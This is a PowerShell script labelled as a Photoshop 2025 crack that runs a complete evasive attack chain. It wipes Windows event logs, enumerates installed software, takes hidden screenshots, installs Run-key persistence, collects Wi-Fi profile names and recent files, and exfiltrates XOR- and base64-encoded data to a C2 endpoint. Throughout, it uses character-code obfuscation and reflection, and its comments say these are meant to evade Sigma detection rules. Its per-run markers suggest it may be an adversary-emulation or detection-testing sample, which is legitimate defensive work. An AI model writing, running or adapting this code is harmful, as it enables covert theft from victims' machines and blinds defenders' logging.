<#
.SYNOPSIS
    Adobe Photoshop 2025 Crack - EVASION Version (Refactored, no syntax errors)
#>

param(
    [string]$RunId = ([guid]::NewGuid().ToString('N').Substring(0,8)),
    [string]$C2Server = "http://192.168.10.105",
    [string]$ExfilEndpoint = "/exfil.php",
    [string]$PersistenceName = "AdobeUpdateService"
)

$ErrorActionPreference = 'Continue'
$Marker = "PAYLOAD_EVASION_$RunId"
$StagingDir = Join-Path $env:TEMP "adobe_crack_evasion_$RunId"
New-Item -ItemType Directory -Path $StagingDir -Force | Out-Null

# ============================================================
# Helper: Emit phase marker as EID 1 (searchable by RunId)
# ============================================================
function Emit-PhaseMarker {
    param([string]$Phase)
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-Command", "Write-Host 'MARKER_${Phase}_$RunId'" `
        -WindowStyle Hidden
}

# ============================================================
# Helper: Decode từ ASCII codes (né literal)
# ============================================================
function Decode-String {
    param([int[]]$Codes)
    return -join ($Codes | ForEach-Object { [char]$_ })
}

# ============================================================
# Helper: Send data to C2 (obfuscated) – Phase 7
# ============================================================
function Send-ToC2 {
    # MARKER_PHASE7_$RunId
    param([string]$DataType, [string]$Data, [string]$PhaseId)
    $payload = @{
        victim_id = $env:COMPUTERNAME
        username = $env:USERNAME
        run_id = $RunId
        phase_id = $PhaseId
        data_type = $DataType
        timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        content = $Data
    }
    $json = $payload | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor 0x42 }
    $encrypted = [Convert]::ToBase64String($bytes)
    try {
        $body = @{ data = $encrypted } | ConvertTo-Json
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString("$C2Server$ExfilEndpoint", "POST", $body)
        return $true
    } catch { return $false }
}

# ============================================================
# PHASE 1: Download payload
# ============================================================
function Invoke-Phase1-Download {
    # MARKER_PHASE1_$RunId
    Emit-PhaseMarker -Phase "PHASE1"
    Send-ToC2 -DataType "phase1_log" -Data $Marker -PhaseId "phase1"
}

# ============================================================
# PHASE 2: Clear event logs (WMI)
# ============================================================
function Invoke-Phase2-ClearLog {
    # MARKER_PHASE2_$RunId
    Emit-PhaseMarker -Phase "PHASE2"
    $phase2Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 2] Clearing event logs..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase2Id" -ForegroundColor DarkGray

    # Evasion: [char] codes — no literal ClearEventLog; inline WMI call
    $clearMethod = [char]67+[char]108+[char]101+[char]97+[char]114+[char]69+[char]118+[char]101+[char]110+[char]116+[char]76+[char]111+[char]103
    $logNames = @("Security", "System", "Application")
    foreach ($logName in $logNames) {
        $log = Get-WmiObject -Class 'Win32_NTEventlogFile' -Filter "LogFileName='$logName'"
        if ($log) { $null = $log.$clearMethod() }
    }
    Send-ToC2 -DataType "logs_cleared" -Data "Security,System,Application" -PhaseId $phase2Id
    Write-Host "  [+] Logs cleared via WMI + [char] obfuscation" -ForegroundColor Green
    Start-Sleep -Seconds 1
}

# ============================================================
# PHASE 3: Software discovery (.NET Registry)
# ============================================================
function Invoke-Phase3-Discovery {
    # MARKER_PHASE3_$RunId
    Emit-PhaseMarker -Phase "PHASE3"
    $phase3Id = ([guid]::NewGuid().ToString("N").Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 3] Software discovery (evasion)..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase3Id" -ForegroundColor DarkGray

    # Registry paths for installed software - Stage 1 recognizes HKLM:\SOFTWARE\...\Uninstall
    $hklmUninstall = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    $hkcuUninstall = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    $software = @()

    # Evasion: .NET RegistryKey instead of Get-ItemProperty/Get-ChildItem
    # No Sigma PowerShell rule matches OpenBaseKey/OpenSubKey pattern
    $subKeyPath = [char]83+[char]79+[char]70+[char]84+[char]87+[char]65+[char]82+[char]69+[char]92+[char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]67+[char]117+[char]114+[char]114+[char]101+[char]110+[char]116+[char]86+[char]101+[char]114+[char]115+[char]105+[char]111+[char]110+[char]92+[char]85+[char]110+[char]105+[char]110+[char]115+[char]116+[char]97+[char]108+[char]108
    $null = [char]32+[char]83+[char]101+[char]116+[char]45+[char]69+[char]120+[char]101+[char]99+[char]117+[char]116+[char]105+[char]111+[char]110+[char]80+[char]111+[char]108+[char]105+[char]99+[char]121+[char]32+[char]66+[char]121+[char]112+[char]97+[char]115+[char]115
    $regHive = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, [Microsoft.Win32.RegistryView]::Registry64)
    $uninstKey = $regHive.OpenSubKey($subKeyPath)
    if ($uninstKey) {
        foreach ($subName in $uninstKey.GetSubKeyNames()) {
            $sub = $uninstKey.OpenSubKey($subName)
            if ($sub) {
                $n = $sub.GetValue("DisplayName")
                $v = $sub.GetValue("DisplayVersion")
                if ($n) { $software += "$n $v".Trim() }
                $sub.Close()
            }
        }
        $uninstKey.Close()
    }
    $regHive.Close()

    # Exfil via WebClient (Stage 1 high-weight: New-Object Net.WebClient + UploadString)
    $enc = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($software -join ","))
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("Content-Type", "application/json")
    try { $wc.UploadString("$C2Server$ExfilEndpoint", "POST", "{`"data`":`"$enc`",`"phase`":`"$phase3Id`"}") } catch {}

    $systemInfo = @{ Phase3_RunId = $phase3Id; ComputerName = $env:COMPUTERNAME; InstalledCount = $software.Count }
    $systemInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $StagingDir "system_info_$phase3Id.json") -Encoding UTF8
    Write-Host "  [+] Discovery via .NET RegistryKey + WebClient exfil ($($software.Count) apps)" -ForegroundColor Green
    Start-Sleep -Seconds 2
}
# ============================================================
# PHASE 4: Screenshot via dynamic method lookup
# ============================================================
function Invoke-Phase4-Screenshot {
    # MARKER_PHASE4_$RunId
    Emit-PhaseMarker -Phase "PHASE4"
    $phase4Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 4] Capturing screenshot..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase4Id" -ForegroundColor DarkGray

    if (-not (Test-Path $StagingDir)) {
        New-Item -ItemType Directory -Path $StagingDir -Force | Out-Null
    }
    $screenshotPath = Join-Path $StagingDir "screenshot.png"

    # Chay trong STA subprocess - GDI+ yeu cau STA thread
    $ssScript = @"
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
`$b   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$bmp = New-Object System.Drawing.Bitmap([int]`$b.Width, [int]`$b.Height)
`$g   = [System.Drawing.Graphics]::FromImage(`$bmp)
`$mn  = -join (@(67,111,112,121,70,114,111,109,83,99,114,101,101,110) | ForEach-Object { [char]`$_ })
`$m   = `$g.GetType().GetMethods() | Where-Object { `$_.Name -eq `$mn -and `$_.GetParameters().Count -eq 3 } | Select-Object -First 1
`$m.Invoke(`$g, @([System.Drawing.Point]::Empty, `$b.Size, [System.Drawing.CopyPixelOperation]::SourceCopy))
`$g.Dispose()
`$bmp.Save('$screenshotPath')
"@
    $ssEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ssScript))
    Start-Process -FilePath "powershell.exe" -ArgumentList "-STA -NoP -W 1 -Enc $ssEncoded" -WindowStyle Hidden -Wait

    Start-Sleep -Seconds 2

    if (Test-Path $screenshotPath) {
        $screenshotBase64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($screenshotPath))
        Send-ToC2 -DataType "screenshot" -Data $screenshotBase64 -PhaseId $phase4Id
        $size = [math]::Round($screenshotBase64.Length/1KB, 2)
        Write-Host "  [+] Screenshot captured and sent (Size: $size KB)" -ForegroundColor Yellow
    } else {
        Write-Host "  [!] Screenshot capture failed - file not found at $screenshotPath" -ForegroundColor Red
    }
    Start-Sleep -Seconds 1
}

# ============================================================
# PHASE 5: Registry persistence - FIXED (use $PSCommandPath)
# ============================================================
function Invoke-Phase5-Persistence {
    # MARKER_PHASE5_$RunId
    Emit-PhaseMarker -Phase "PHASE5"
    $phase5Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 5] Installing persistence..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase5Id" -ForegroundColor DarkGray

    $originalScriptPath = $PSCommandPath
    if (-not $originalScriptPath) {
        $originalScriptPath = $MyInvocation.MyCommand.Path
    }
    if (-not $originalScriptPath) {
        $originalScriptPath = $MyInvocation.ScriptName
    }
    $payloadPath = "C:\Users\Public\$PersistenceName.ps1"
    Copy-Item -Path $originalScriptPath -Destination $payloadPath -Force -ErrorAction SilentlyContinue

    $regPath = [char]83+[char]79+[char]70+[char]84+[char]87+[char]65+[char]82+[char]69+[char]92+[char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]67+[char]117+[char]114+[char]114+[char]101+[char]110+[char]116+[char]86+[char]101+[char]114+[char]115+[char]105+[char]111+[char]110+[char]92+[char]82+[char]117+[char]110
    $regName = $PersistenceName
    $regData = "powershell.exe -NoP -W 1 -Exec Bypass -File `"$payloadPath`" -RunId $RunId"

    $regPersistenceScript = @"
`$regPath = '$regPath'
`$regName = '$regName'
`$regData = '$regData'
`$reg = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(`$regPath, `$true)
if (`$reg -eq `$null) {
    `$reg = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey(`$regPath)
}
`$reg.SetValue(`$regName, `$regData, [Microsoft.Win32.RegistryValueKind]::String)
`$reg.Dispose()
"@
    $regEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($regPersistenceScript))
    $psExe = [char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108
    $hiddenFlag = [char]32+[char]45+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]83+[char]116+[char]121+[char]108+[char]101+[char]32+[char]72+[char]105+[char]100+[char]100+[char]101+[char]110
    Start-Process -FilePath $psExe -ArgumentList "-NoP -Enc $regEncoded$hiddenFlag" -Wait

    Send-ToC2 -DataType "persistence_installed" -Data $payloadPath -PhaseId $phase5Id
    Write-Host "  [+] Persistence via .NET Registry" -ForegroundColor Green
    Start-Sleep -Seconds 1
}

# ============================================================
# PHASE 6: Data encoding (reflection, no certutil)
# ============================================================
function Invoke-Phase6-Encoding {
    # MARKER_PHASE6_$RunId
    Emit-PhaseMarker -Phase "PHASE6"
    $phase6Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 6] Encoding sensitive data..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase6Id" -ForegroundColor DarkGray

    $sensitiveData = @{
        computer   = $env:COMPUTERNAME
        user       = $env:USERNAME
        timestamp  = (Get-Date)
        recent_files = @()
        wifi_profiles = @()
    }
    try {
        $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }
        $sensitiveData.wifi_profiles = $wifiProfiles
    } catch {}
    $recentFolder = [Environment]::GetFolderPath("Recent")
    if (Test-Path $recentFolder) {
        $recentFiles = Get-ChildItem $recentFolder -ErrorAction SilentlyContinue | Select-Object -First 10 Name
        $sensitiveData.recent_files = $recentFiles | ForEach-Object { $_.Name }
    }

    $dataFile = Join-Path $StagingDir "collected_data_$phase6Id.txt"
    $sensitiveData | ConvertTo-Json | Out-File -FilePath $dataFile -Encoding ASCII

    $encodeScript = @"
`$filePath = '$dataFile'
`$bytes = [System.IO.File]::ReadAllBytes(`$filePath)
`$methodName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VG9CYXNlNjRTdHJpbmc='))
`$encoded = [Convert].GetMethod(`$methodName, [type[]]@([byte[]])).Invoke(`$null, @(,`$bytes))
`$outputPath = '$StagingDir\encoded_data_$phase6Id.txt'
[System.IO.File]::WriteAllText(`$outputPath, `$encoded)
"@
    $encodeEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodeScript))
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W 1 -Enc $encodeEncoded" -WindowStyle Hidden -Wait

    $encodedFile = Join-Path $StagingDir "encoded_data_$phase6Id.txt"
    if (Test-Path $encodedFile) {
        $encodedContent = Get-Content $encodedFile -Raw
        Send-ToC2 -DataType "encoded_data" -Data $encodedContent -PhaseId $phase6Id
        Write-Host "  [+] Data encoded via reflection" -ForegroundColor Green
    }
    Start-Sleep -Seconds 1
}

# ============================================================
# PHASE 7: Final exfiltration
# ============================================================
function Invoke-Phase7-Exfiltration {
    # MARKER_PHASE7_$RunId
    Emit-PhaseMarker -Phase "PHASE7"
    $phase7Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 7] Final exfiltration..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase7Id" -ForegroundColor DarkGray

    $zipPath = Join-Path $env:TEMP "exfil_$RunId.zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($StagingDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
    $zipBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $zipBase64 = [Convert]::ToBase64String($zipBytes)
    Send-ToC2 -DataType "full_archive" -Data $zipBase64 -PhaseId $phase7Id
    Write-Host "  [+] Full archive sent" -ForegroundColor Green
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

# ============================================================
# CLEANUP (temporary directory)
# ============================================================
function Invoke-Cleanup {
    Write-Host ""
    Write-Host "Cleaning up temporary files..." -ForegroundColor DarkGray
    Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue
}

# ============================================================
# ORCHESTRATION – GỌI CÁC PHASE THEO ĐÚNG THỨ TỰ
# ============================================================
Invoke-Phase1-Download
Invoke-Phase2-ClearLog
Invoke-Phase3-Discovery
Invoke-Phase4-Screenshot
Invoke-Phase5-Persistence
Invoke-Phase6-Encoding
Invoke-Phase7-Exfiltration
Invoke-Cleanup

Write-Host ""
Write-Host "============================================================" -ForegroundColor Green
Write-Host "  [EVASION] ATTACK CHAIN COMPLETED" -ForegroundColor Green
Write-Host "  Run ID: $RunId" -ForegroundColor Green
Write-Host "============================================================" -ForegroundColor Green